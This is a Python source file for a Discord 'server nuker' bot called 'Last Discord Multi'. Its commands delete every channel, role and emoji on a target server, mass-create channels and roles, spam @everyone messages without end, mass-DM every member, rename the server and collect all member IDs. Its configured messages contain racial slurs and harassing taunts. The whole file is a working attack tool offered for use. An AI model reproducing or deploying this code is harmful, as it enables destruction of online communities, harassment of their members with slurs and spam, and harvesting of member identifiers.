import random 
import ctypes 
import discord.http
import pystyle
import discord
import asyncio
import aiohttp
from discord.ext import commands
import threading
import httpx
import time
import os
from colorama import Fore
import json
import string
import requests


# go to the README.MD and make sure you follow ALL steps before running!

toolname = "Last Discord Multi"
toolversion = "1.0.0"


#                          __   _          
#   ___    ___    _ __    / _| (_)   __ _  
#  / __|  / _ \  | '_ \  | |_  | |  / _` | 
# | (__  | (_) | | | | | |  _| | | | (_| | 
#  \___|  \___/  |_| |_| |_|   |_|  \__, | 
#                                   |___/  


name = toolname.split(' ')[0].lower()
token = "BOT TOKEN HERE!" # token of the bot
prefix = "PREFIX OF THE BOT HERE" # prefix the bot will use
stream_name = f"i love {name}" # the message you see when the bot is streaming
nuke_message = f"@everyone these lil niggas getting cucked by {name}" # message that spams all channels
rname = f"cucked by {name}" # the names of roles when you make them
dm_message = f"🤡 {toolname} runs you lil nigga 🤣 get nuked!" # message you get dmed 
channel_name = f"nuked-by-{name}" # name of the channels created
emojis = ['🤡', '🤣', '😂', '😆', '🎩', '🎇', '🎈', '🎃', '🎭', '🎱', '💎'] # emojis dont change them 
server_name = f"i love {name}" # name of the server when u rename server
spam_message = f"{name} runs you!" # message that also spams idk

 
def menu():
    global onstart 
    print(f"""
          
          
          
          
          
          

{Fore.CYAN}    $$\                                         $$\           
{Fore.CYAN}    $$ |                                        $$ |          
{Fore.CYAN}    $$ |       $$$$$$\         $$$$$$$\       $$$$$$\         
{Fore.CYAN}    $$ |       \____$$\       $$  _____|      \_$$  _|        
{Fore.CYAN}    $$ |       $$$$$$$ |      \$$$$$$\          $$ |          
{Fore.CYAN}    $$ |      $$  __$$ |       \____$$\         $$ |$$\       
{Fore.CYAN}    $$ |      \$$$$$$$ |      $$$$$$$  |        \$$$$  |      
{Fore.CYAN}    \__|       \_______|      \_______/          \____/     



                                                                                                    {Fore.BLUE}  __     __    _        ___     ___  
                                                                                                    {Fore.BLUE}  \ \   / /   / |      / _ \   / _ \ 
                                                                                                    {Fore.BLUE}   \ \ / /    | |     | | | | | | | |
                                                                                                    {Fore.BLUE}    \ V /     | |  _  | |_| | | |_| |
                                                                                                    {Fore.BLUE}     \_/      |_| (_)  \___/   \___/ 
                                    


{Fore.BLUE}

    ╔═════[0] Exit
    ║
    ║   
    ║══════════[1] Support
    ║
    ║
    ║══════════════════[2] Discord Server Nuker
    ║
    ║
    ╚════════════════════════ More features coming soon :D                                                                                     

    
            
""")
    


    command_input = input("$> ")

    if command_input == "0":
        print("Are you sure you want to exit ? \n")
        time.sleep(3)
        command_input = input("     Y/N $> ")
        

    if command_input == "1":
        time.sleep(0.5)
        print("Programmed by L6S $$$ \nDiscord @hate16 $$$ \nTelegram @Incubates $$$")
        
    
    if command_input == "2":
#        command_input_option2 = input("Are all requirements in the config filled in? Y/N \n$>")
#        if command_input_option2 == "N":
#            print("Please fill in every requiremnet and open the README.md if you need further help. Rerun the multi tool once done.")
#        elif command_input_option2 == "Y":
#            command_input_option2_second = input("Have you invited the bot to the targeted server? Y/N \n$> ")
#            if command_input_option2_second == "N":
#                time.sleep(1)
#                print("Please invite the bot to the targeted server. Rerun the multi tool once done.")
#            if command_input_option2_second == "Y":
                time.sleep(0.35)
                input(f"\nPRESS ENTER TO SEE LOGS!!! Make sure you have invited the bot to the targeted server. Do {prefix}help to see what commands the bot has! Enjoy :D")
                print(f"""
{Fore.CYAN}
    __                         
   / /  ____     ____ _   _____
  / /  / __ \   / __ `/  / ___/
 / /  / /_/ /  / /_/ /  (__  ) 
/_/   \____/   \__, /  /____/  
              /____/           
_______________________________________________________________________________                      
                      """)
                                                      
                            



 


intents = discord.Intents.all()
intents.message_content = True

bot = commands.Bot(
    command_prefix=prefix, 
    intents=intents
)
bot.remove_command('help')


#           _                    _                   
#     ___  | |_    __ _   _ __  | |_   _   _   _ __  
#    / __| | __|  / _` | | '__| | __| | | | | | '_ \ 
#    \__ \ | |_  | (_| | | |    | |_  | |_| | | |_) |
#    |___/  \__|  \__,_| |_|     \__|  \__,_| | .__/ 
#                                             |_|    


@bot.event
async def on_ready():
    print(f"\n{Fore.LIGHTCYAN_EX}Bot has been successfully started.")
    print(f"\n{Fore.LIGHTCYAN_EX}Bot is now running.")
    print(f"\n{Fore.LIGHTCYAN_EX}Do " + prefix + "help to see the command list.")


#     _              _         
#    | |__     ___  | |  _ __  
#    | '_ \   / _ \ | | | '_ \ 
#    | | | | |  __/ | | | |_) |
#    |_| |_|  \___| |_| | .__/ 
#                       |_|    


@bot.command()
async def help(ctx):
    print(f'{Fore.LIGHTCYAN_EX}Help command used by {ctx.author}.')
    embed = discord.Embed(
        colour=discord.Colour.dark_blue(),
        title='Help with Last Multi',
        description=f'You used the command in server: [{ctx.guild.name}](https://discord.com/channels/{ctx.guild.id}/{ctx.channel.id})'
    )
    embed.set_footer(text=f'Plugged by {toolname}')
    embed.set_author(name=f'{toolname}')

    embed.add_field(name="💥 | Server Destroyer", value=f"`createchannel` Creates 50 channels \n`deletechannel` Deletes all channels \n`createrole` Creates 50 roles \n`deleterole` Deletes all roles \n`delemoji` Deletes all emojis \n`nuke` Destroys the server \n`spam` Spams messages and embeds \n`dmall` Dms all members in the server".replace('> ', '').lower())
    embed.add_field(name="🎡 | Miscellaneous", value=f"`stream` Changes the bots presence to streaming \n`srename` Renames the server \n`sreicon` Changes the icon of the server \n`gatherid` Gathers all ids into a new .txt file".replace('> ', '').lower())
    await ctx.author.send(embed=embed)
    print(f"{Fore.LIGHTCYAN_EX}Help message has been sent to {ctx.author}'s dms")


#            _                                      _ 
#      ___  | |__     __ _   _ __    _ __     ___  | |
#     / __| | '_ \   / _` | | '_ \  | '_ \   / _ \ | |
#    | (__  | | | | | (_| | | | | | | | | | |  __/ | |
#     \___| |_| |_|  \__,_| |_| |_| |_| |_|  \___| |_|
                                                  

@bot.command()
async def deletechannel(ctx):
    print(f"\n{Fore.LIGHTCYAN_EX}{ctx.author} has used deletechannel command.")
    print(f"\n{Fore.LIGHTCYAN_EX}Sending command now.")
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try: 
            await channel.delete()
            print(f"\n{Fore.LIGHTCYAN_EX}Deleted channel #{channel.name}")
        except discord.HTTPException as e:
            if e.status == 429:
                print(f"\n{Fore.LIGHTCYAN_EX}Ratelimited on delete channel #{channel.name}")
        except:
            print(f"\n{Fore.LIGHTCYAN_EX}Command Failed. Internal issue!")


@bot.command()
async def createchannel(ctx):
    print(f"\n{Fore.LIGHTCYAN_EX}{ctx.author} has used createchannel command.")
    print(f"\n{Fore.LIGHTCYAN_EX}Sending command now.")
    await ctx.message.delete()
    guild = ctx.message.guild
    for i in range(50): # change the number to the amount of channels you would like to create
        try:
            c = await ctx.guild.create_text_channel(f'{random.choice(emojis)}' + channel_name)
            print(f"{Fore.LIGHTCYAN_EX}{ctx.author} created channel #{c.name}")
        except discord.HTTPException as e:
           if e.status == 429:
            print(f"\n{Fore.LIGHTCYAN_EX}Ratelimited on create channel")
        except: 
            print(f"\n{Fore.LIGHTCYAN_EX}Command Failed. Internal issue!")


#                    _        
#     _ __    ___   | |   ___ 
#    | '__|  / _ \  | |  / _ \
#    | |    | (_) | | | |  __/
#    |_|     \___/  |_|  \___|
                          

@bot.command()
async def createrole(ctx):
    print(f"\n{Fore.LIGHTCYAN_EX}{ctx.author} has used createrole command.")
    print(f"\n{Fore.LIGHTCYAN_EX}Fulfilling command now.")
    await ctx.message.delete()
    for i in range(50):
        try:
            r = await ctx.guild.create_role(name=rname, color =0x0000ff)
            print(f"\n{Fore.LIGHTCYAN_EX}{ctx.author} has created a role ({r.name})")
        except discord.HTTPException as e:
            if e.status == 429:
                print(f"\n{Fore.LIGHTCYAN_EX}Ratelimited on create role")
        except:
            print(f"\n{Fore.LIGHTCYAN_EX}Command Failed. Internal issue!")


@bot.command()
async def deleterole(ctx):
    print(f"{Fore.LIGHTCYAN_EX}\nUser has used the deleterole command!")
    print(f"{Fore.LIGHTCYAN_EX}\nFulfilling command now!")
    await ctx.message.delete()
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(f"{Fore.LIGHTCYAN_EX}\nDeleted role {role.name}")
            except discord.HTTPException as e:
                if e.status == 429:
                    print(f"{Fore.LIGHTCYAN_EX}\nRatelimited on deleting roles!")
            except:
                print(f"{Fore.LIGHTCYAN_EX}\nCommand Failed. Internal issue!")


#           _             _                 
#     ___  | |_    __ _  | |_   _   _   ___ 
#    / __| | __|  / _` | | __| | | | | / __|
#    \__ \ | |_  | (_| | | |_  | |_| | \__ \
#    |___/  \__|  \__,_|  \__|  \__,_| |___/
                                        

@bot.command()
async def stream(ctx):
    print(f"\n{Fore.LIGHTCYAN_EX}{ctx.author} has used the stream command.")
    print(f"\n{Fore.LIGHTCYAN_EX}Fulfilling command now.")
    await ctx.message.delete()
    await bot.change_presence(activity=discord.Streaming(name=stream_name, url='https://www.twitch.tv/16last'))
    print(f"\n{Fore.LIGHTCYAN_EX}Presence of the bot has been successfully changed!")


#     ____    __  __  
#    |  _ \  |  \/  | 
#    | | | | | |\/| | 
#    | |_| | | |  | | 
#    |____/  |_|  |_| 
                  

@bot.command()
async def dmall(ctx):
    print(f"\n{Fore.LIGHTCYAN_EX}{ctx.user} has used the dmall command.")
    print(f"\n{Fore.LIGHTCYAN_EX}Fulfilling command now.")
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        if member != bot.user:
            try:
                await member.send(f'<@{member.id}> ' + dm_message)
                print(f"\n{Fore.LIGHTCYAN_EX}DM has been sent to {member.name} ({member.id})")
            except discord.HTTPException as e:
                if e.status == 429:
                    print(f"\n{Fore.LIGHTCYAN_EX}Ratelimited on sending DM to {member.name} ({member.id})")
            except:
                print(f"\n{Fore.LIGHTCYAN_EX}Comman Failed. Internal issue!")


#                               _   _ 
#   ___   _ __ ___     ___     (_) (_)
#  / _ \ | '_ ` _ \   / _ \    | | | |
# |  __/ | | | | | | | (_) |   | | | |
#  \___| |_| |_| |_|  \___/   _/ | |_|
#                            |__/     


@bot.command()
async def delemoji(ctx):
    print(f"{Fore.LIGHTCYAN_EX}\nUser has used the delemoji command!")
    print(f"{Fore.LIGHTCYAN_EX}\nFulfilling command now!")
    await ctx.message.delete()
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            print(f"{Fore.LIGHTCYAN_EX}\nDeleted emoji {emoji.name}!")
        except discord.HTTPException as e:
            if e.status == 429:
                print(f"{Fore.LIGHTCYAN_EX}\nRatelimited on deleting emojis!")
        except:
            print(f"{Fore.LIGHTCYAN_EX}Command Failed. Internal issue!")


#                  _           
#  _ __    _   _  | | __   ___ 
# | '_ \  | | | | | |/ /  / _ \
# | | | | | |_| | |   <  |  __/
# |_| |_|  \__,_| |_|\_\  \___|
                              
                       

@bot.command()
async def nuke(ctx):
    print(f"\n{Fore.LIGHTCYAN_EX}WARNING! User has used the nuke command. ")
    print(f"\n{Fore.LIGHTCYAN_EX}Fulfilling command now.")
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try: 
            await channel.delete()
            print(f"\n{Fore.LIGHTCYAN_EX}Deleted channel #{channel.name}")
        except discord.HTTPException as e:
            if e.status == 429:
                print(f"\n{Fore.LIGHTCYAN_EX}Ratelimited on delete channel #{channel.name}")
        except:
            print(f"\n{Fore.LIGHTCYAN_EX}Command Failed. Internal issue!")

    guild = ctx.message.guild
    for i in range(50):
        try:
            c = await ctx.guild.create_text_channel(f'{random.choice(emojis)}' + channel_name)
            print(f"\n{Fore.LIGHTCYAN_EX}{ctx.author} created channel {c.name}")
        except discord.HTTPException as e:
           if e.status == 429:
            print(f"\n{Fore.LIGHTCYAN_EX}Ratelimited on create channel")
        except: 
            print(f"\n{Fore.LIGHTCYAN_EX}Command Failed. Internal issue!")

    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(f"\n{Fore.LIGHTCYAN_EX}\nDeleted role {role.name}")
            except discord.HTTPException as e:
                if e.status == 429:
                    print(f"\n{Fore.LIGHTCYAN_EX}\nRatelimited on deleting roles!")
            except:
                print(f"\n{Fore.LIGHTCYAN_EX}\nCommand Failed. Internal issue!")

    for i in range(50):
        try:
            r = await ctx.guild.create_role(name=rname, color =0x0000ff)
            print(f"\n{Fore.LIGHTCYAN_EX}{ctx.author} has created role ({r.name})")
        except discord.HTTPException as e:
            if e.status == 429:
                print(f"\n{Fore.LIGHTCYAN_EX}Ratelimited on create role")
        except:
            print(f"\n{Fore.LIGHTCYAN_EX}Command Failed. Internal issue!")

    for member in list(ctx.guild.members):
        if member != bot.user:
            try:
                await member.send(f'<@{member.id}> ' + dm_message)
                print(f"\n{Fore.LIGHTCYAN_EX}DM has been sent to {member.name} ({member.id})")
            except discord.HTTPException as e:
                if e.status == 429:
                    print(f"\n{Fore.LIGHTCYAN_EX}Ratelimited on sending DM to {member.name} ({member.id})")
            except:
                print(f"\n{Fore.LIGHTCYAN_EX}Comman Failed. Internal issue!")
    

                                     
#  ___    ___   _ __  __   __   ___   _ __ 
# / __|  / _ \ | '__| \ \ / /  / _ \ | '__|
# \__ \ |  __/ | |     \ V /  |  __/ | |   
# |___/  \___| |_|      \_/    \___| |_|   
                                          

@bot.command()
async def srename(ctx):
    print(f"\n{Fore.LIGHTCYAN_EX}User has used the srename command!")
    print(f"\n{Fore.LIGHTCYAN_EX}Fulfilling command now!")
    await ctx.message.delete()
    await ctx.guild.edit(name=server_name)
    print(f"\n{Fore.LIGHTCYAN_EX}Server name has been changed successfully!")


@bot.command()
async def sreicon(ctx): ## to change the icon add a icon or a pfp to the folder, then change 'pfp.jpg' to the icon you added.
    print(f"\n{Fore.LIGHTCYAN_EX}User has used the sreicon command!")
    print(f"\n{Fore.LIGHTCYAN_EX}Fulfilling command now!")
    await ctx.message.delete()
    with open('clown.jpg', 'rb') as logofile:
        icon = logofile.read()
    await ctx.guild.edit(icon=icon)
    print(f"\n{Fore.LIGHTCYAN_EX}Icon of the server has been successfully changed!")

                                  
#  ___   _ __     __ _   _ __ ___  
# / __| | '_ \   / _` | | '_ ` _ \ 
# \__ \ | |_) | | (_| | | | | | | |
# |___/ | .__/   \__,_| |_| |_| |_|
#       |_|                        


@bot.command()
async def spam(ctx):
    print(f"{Fore.LIGHTCYAN_EX}\nUser has used the spam command!")
    print(f"{Fore.LIGHTCYAN_EX}\nFulfilling command now!")
    await ctx.message.delete()
    for i in range(50):
        while True:
            for channel in ctx.guild.channels:
                try:
                    embed = discord.Embed(
                        colour=discord.Colour.red(),
                        title=spam_message,
                        description=spam_message
                    )
                    embed.set_author(name=toolname)
                    embed.set_footer(text='Plugged by ' + toolname)
                    await channel.send('@everyone ' + spam_message)
                    print(f"{Fore.LIGHTCYAN_EX}\nSent message to #{channel.name}")
                except:
                    print(f"{Fore.LIGHTCYAN_EX}\nCommand Failed. Internal issue!")


#  _       _ 
# (_)   __| |
# | |  / _` |
# | | | (_| |
# |_|  \__,_|
            

@bot.command()
async def gatherid(ctx):
    print(f"{Fore.LIGHTCYAN_EX}\nUser has used the gatherid command!")
    print(f"{Fore.LIGHTCYAN_EX}\nFulfilling command now!")
    await ctx.message.delete()
    file = open(f'ids/{ctx.guild.id}.txt', 'w+')
    ids = []
    for member in list(ctx.guild.members):
        try:
            ids.append(member.id)
        except:
            pass
    for mid in ids:
        file.write(str(mid) + '\n')
    print(f"{Fore.LIGHTCYAN_EX}\nGathered {len(ids)} member IDs. Saved to ids/{ctx.guild.id}.txt")


#    _   
#  _| |_ 
# |_   _|
#   |_|  
        

@bot.event
async def on_guild_channel_create(channel):
    for i in range(999999999999999):
        try:
            await channel.send(nuke_message)
        except discord.HTTPException as e:
            if e.status == 429:
                print(f"\n{Fore.LIGHTCYAN_EX}Unkown issue ???")
        except:
            print(f"\n{Fore.LIGHTCYAN_EX}Command Failed. Internal issue!")

                        
#  _ __   _   _   _ __   
# | '__| | | | | | '_ \  
# | |    | |_| | | | | | 
# |_|     \__,_| |_| |_| 
                        

def onstart():
    cmd = 'mode 180, 42'
    os.system(cmd)
    os.system(f'cls && title {toolname}')
    menu()

onstart()
bot.run(token, log_handler=None)